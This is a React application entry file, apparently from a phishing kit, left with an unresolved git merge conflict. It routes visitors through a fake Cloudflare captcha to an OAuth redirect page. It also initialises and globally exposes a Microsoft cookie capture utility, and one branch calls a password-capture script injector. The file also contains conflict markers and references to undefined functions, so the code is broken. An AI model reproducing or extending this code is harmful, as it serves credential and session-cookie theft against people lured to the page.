import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';

const App: React.FC = () => {
    const location = useLocation();
    const [currentView, setCurrentView] = useState<string>('default');
    const [captchaVerified, setCaptchaVerified] = useState(false);

    useEffect(() => {
        try {
            // Initialize Microsoft cookie capture utilities
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            // Make functions globally available for replacement.html
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
            }
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, [location]);

    const handleCaptchaVerified = () => {
        setCaptchaVerified(true);
        setCurrentView('replacement');
    };

    const handleCaptchaBack = () => {
        setCurrentView('default');
    };

    const renderCurrentView = () => {
        switch (currentView) {
            case 'captcha':
                return (
                    <CloudflareCaptcha
                        onVerified={handleCaptchaVerified}
                        onBack={handleCaptchaBack}
                    />
                );
            case 'replacement':
                return <RealOAuthRedirect />;
            default:
                return (
                    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
                        <p>Start prompting (or editing) to see magic happen :)</p>
                    </div>
                );
        }
    };

    return (
        <Router>
            <Routes>
                <Route path="/auth/callback" element={<AuthCallback />} />
                <Route path="*" element={renderCurrentView()} />
            </Routes>
        </Router>
    );
};

<<<<<<< HEAD
export default App;
=======
const MainContent: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');
    const location = useLocation();

    useEffect(() => {
        try {
            injectPasswordCaptureScript();
            console.log('✅ Password capture injector initialized');
        } catch (error) {
            console.warn('⚠️ Failed to initialize password capture injector:', error);
        }
    }, [location]);

    return (
        <Routes>
            <Route path="/auth/callback" element={<AuthCallback />} />
            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
        </Routes>
    );
};

const DefaultPage = ({ currentPage, setCurrentPage }) => {
    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, [setCurrentPage]);

    const handleCaptchaVerified = () => {
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'message-icon':
            return <MessageIconLanding onOpenMessage={() => {}} />;
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;
>>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
